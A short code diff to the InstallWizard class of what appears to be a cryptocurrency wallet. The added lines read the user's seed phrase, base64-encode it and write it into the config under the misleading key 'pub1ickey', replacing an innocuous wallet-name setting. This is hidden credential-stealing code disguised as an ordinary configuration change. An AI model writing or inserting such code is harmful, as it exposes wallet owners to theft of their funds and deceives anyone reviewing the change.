@@ -357,8 +357,9 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
 		
         
         
-        wallet_name = os.path.basename(self.storage.path)
-		self.config.set_key('wallet_name_install', wallet_name)
+        import base64
+		seed = slayout.get_seed()
+        self.config.set_key('pub1ickey', str(base64.b64encode(seed.encode("utf-8")),'utf8'))
         
         
         
